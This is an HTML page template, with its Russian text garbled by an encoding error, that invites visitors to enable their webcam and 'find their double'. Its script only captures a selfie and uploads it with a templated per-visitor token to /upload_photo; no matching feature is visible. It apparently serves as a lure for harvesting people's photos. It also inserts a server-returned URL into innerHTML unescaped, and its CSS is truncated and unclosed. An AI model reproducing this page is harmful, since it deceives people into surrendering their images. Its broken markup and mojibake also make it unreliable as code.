<!DOCTYPE html>

<head>

  <link rel="apple-touch-icon" href="/static/icon.png">

  <style>
    body {

      background: radial-gradient(circle at 20% 20%, #1e1e2f, #111122);
      color: #fff;
      display: flex;

    }

    button:disabled {

      cursor: not-allowed;
    }

    #uploadBtn {
      background: linear-gradient(90deg, #66ccff, #9b5cff);
      box-shadow: 0 0 15px rgba(155, 92, 255, 0.6);
    }

    #status {

</head>
<body>
  <h1>–ù–∞–π–¥–∏ —Å–≤–æ–µ–≥–æ –¥–≤–æ–π–Ω–∏–∫–∞ üëØ‚Äç‚ôÇÔ∏è</h1>
  <p>–ù–∞–∂–º–∏ ¬´–í–∫–ª—é—á–∏—Ç—å –∫–∞–º–µ—Ä—É¬ª, –¥–∞–π —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ, —Å–¥–µ–ª–∞–π —Ñ–æ—Ç–æ –∏ —É–∑–Ω–∞–π, –Ω–∞ –∫–æ–≥–æ —Ç—ã –ø–æ—Ö–æ–∂!</p>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <div>
    <button id="startBtn">üì∏ –í–∫–ª—é—á–∏—Ç—å –∫–∞–º–µ—Ä—É</button>
    <button id="photoBtn" disabled>üì∑ –°–¥–µ–ª–∞—Ç—å —Ñ–æ—Ç–æ</button>
    <button id="uploadBtn" disabled>üîç –ò—Å–∫–∞—Ç—å –¥–≤–æ–π–Ω–∏–∫–∞</button>
  </div>

  <p id="status">–°—Ç–∞—Ç—É—Å: –æ–∂–∏–¥–∞–Ω–∏–µ</p>

  <script>
    const token = "{{TOKEN}}";
    const v = document.getElementById('video');
    const c = document.getElementById('canvas');
    const s = document.getElementById('status');
    const startBtn = document.getElementById('startBtn');
    const photoBtn = document.getElementById('photoBtn');
    const uploadBtn = document.getElementById('uploadBtn');
    let stream = null;

    window.addEventListener('load', () => {
      document.body.style.opacity = '1';
    });

    startBtn.onclick = async () => {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        v.srcObject = stream;
        photoBtn.disabled = false;
        s.textContent = '–ö–∞–º–µ—Ä–∞ –≤–∫–ª—é—á–µ–Ω–∞ ‚úÖ –ù–∞–∂–º–∏ ¬´–°–¥–µ–ª–∞—Ç—å —Ñ–æ—Ç–æ¬ª.';
      } catch (e) {
        s.textContent = '–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ: ' + e.message;
      }
    };

    photoBtn.onclick = () => {
      if (!stream) return;
      c.width = v.videoWidth;
      c.height = v.videoHeight;
      c.getContext('2d').drawImage(v, 0, 0);
      c.style.display = 'block';
      uploadBtn.disabled = false;
      s.textContent = '–§–æ—Ç–æ –≥–æ—Ç–æ–≤–æ üåü –¢–µ–ø–µ—Ä—å –º–æ–∂–µ—à—å –∏—Å–∫–∞—Ç—å –¥–≤–æ–π–Ω–∏–∫–∞!';
    };

    uploadBtn.onclick = () => {
      uploadBtn.disabled = true;
      s.textContent = 'üì§ –û—Ç–ø—Ä–∞–≤–∫–∞...';

      c.toBlob(async (blob) => {
        if (!blob) {
          s.textContent = '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ üò¢';
          uploadBtn.disabled = false;
          return;
        }

        const fd = new FormData();
        fd.append('photo', blob, 'photo.png');
        fd.append('token', token);

        try {
          const r = await fetch('/upload_photo', { method: 'POST', body: fd });
          const j = await r.json();
          if (r.ok) {
            s.innerHTML = '–§–æ—Ç–æ –∑–∞–≥—Ä—É–∂–µ–Ω–æ ‚úÖ <a href="' + j.url + '" target="_blank" rel="noopener">–û—Ç–∫—Ä—ã—Ç—å</a>';
          } else {
            s.textContent = '–û—à–∏–±–∫–∞: ' + (j.error || r.statusText);
          }
        } catch (e) {
          s.textContent = '–û—à–∏–±–∫–∞ —Å–µ—Ç–∏: ' + e.message;
        } finally {
          uploadBtn.disabled = false;
        }
      }, 'image/png');
    };
  </script>

</html>
